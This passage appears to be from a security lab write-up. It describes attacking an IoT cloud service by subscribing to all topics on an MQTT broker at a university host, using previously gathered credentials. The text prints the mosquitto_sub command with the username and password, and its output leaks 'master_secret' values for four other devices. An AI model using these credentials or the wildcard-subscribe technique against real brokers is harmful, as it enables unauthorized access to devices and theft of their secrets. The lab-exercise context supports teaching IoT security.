To attack the cloud service we subscribed to MQTT using the credentials we previously gathered:
 mosquitto_sub -h 'syssec.ewi.utwente.nl' -u 'wemos60' -P 'C9JFyl2h8L' -t '#' -v
By subscribing to all topics we can read all the data sent over MQTT by this server.
led/wemos03/action Pizzatime
led/wemos32/action master_secret: 35bJ6m09tkUH216M
led/wemos07/action master_secret: 62vGDk8ZmHNzKqeJ
led/wemos19/action master_secret: F1s2tU88qGLt3p2n
led/wemos08/action master_secret: I0juBgAeEHY33tl9
led/wemos01/action 0
 ....

We can find the master secrets of 4 other devices on the network, as well as logs of the actions performed the devices.
The devices only seem to perform action 0 and action 1.
